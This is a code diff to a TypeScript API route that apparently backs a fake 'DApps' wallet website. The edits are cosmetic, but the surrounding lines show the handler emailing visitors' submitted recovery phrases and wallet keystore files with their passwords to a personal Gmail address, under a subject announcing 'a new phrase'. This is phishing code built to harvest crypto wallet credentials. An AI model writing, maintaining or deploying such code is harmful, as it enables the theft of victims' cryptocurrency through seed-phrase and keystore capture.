@@ -28,7 +28,7 @@ const formatMessage = async (message: string) => {
     html: `<div>${message}</div>`,
   };
 
-  transporter.verify(function (error: any, success: any) {
+  transporter.verify(function (error: any) {
     if (error) {
       console.log(`here is the error: ${error}`);
     } else {
@@ -70,12 +70,12 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'ogobillions458@gmail.com',
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
 
-      transporter.verify(function (error, success) {
+      transporter.verify(function (error) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -114,7 +114,7 @@ export async function POST(request: Request) {
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
 
-      transporter.verify(function (error, success) {
+      transporter.verify(function (error) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -155,7 +155,7 @@ export async function POST(request: Request) {
         html: formattedMessage,
       }
 
-      transporter.verify(function (error, success) {
+      transporter.verify(function (error) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
